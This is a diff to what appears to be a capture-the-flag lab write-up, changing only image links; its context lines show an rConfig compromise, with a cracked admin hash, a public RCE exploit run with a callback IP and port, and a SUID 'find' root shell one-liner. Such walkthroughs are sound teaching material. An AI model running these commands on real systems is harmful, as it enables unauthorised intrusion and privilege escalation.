@@ -45,7 +45,7 @@ Nothing much there.
 
 Port 8081 was hosting an `rConfig` instance:
 
-![](<../../../.gitbook/assets/image%20(241).png>)
+![](../../../.gitbook/assets/quackerjack-2.png)
 
 This version was vulnerable to a few exploits:
 
@@ -77,7 +77,7 @@ admin:1:dc40b85276a1f4d7cb35f154236aa1b2
 
 The above hash is crackable on CrackStation.
 
-![](<../../../.gitbook/assets/image%20(589).png>)
+![](../../../.gitbook/assets/quackerjack-4.png)
 
 We can then run the RCE exploit `48241.py`:
 
@@ -85,7 +85,7 @@ We can then run the RCE exploit `48241.py`:
 $ python3 48241.py https://192.168.233.57:8081 admin abgrtyu 192.168.45.161 21
 ```
 
-![](<../../../.gitbook/assets/image%20(1677).png>)
+![](../../../.gitbook/assets/quackerjack-1.png)
 
 We can then grab the user flag.
 
@@ -124,6 +124,6 @@ We can run `find` as the `root` user. Following GTFOBins, we just need to run th
 ./find . -exec /bin/sh -p \; -quit
 ```
 
-![](<../../../.gitbook/assets/image%20(3208).png>)
+![](../../../.gitbook/assets/quackerjack-3.png)
 
 Rooted!
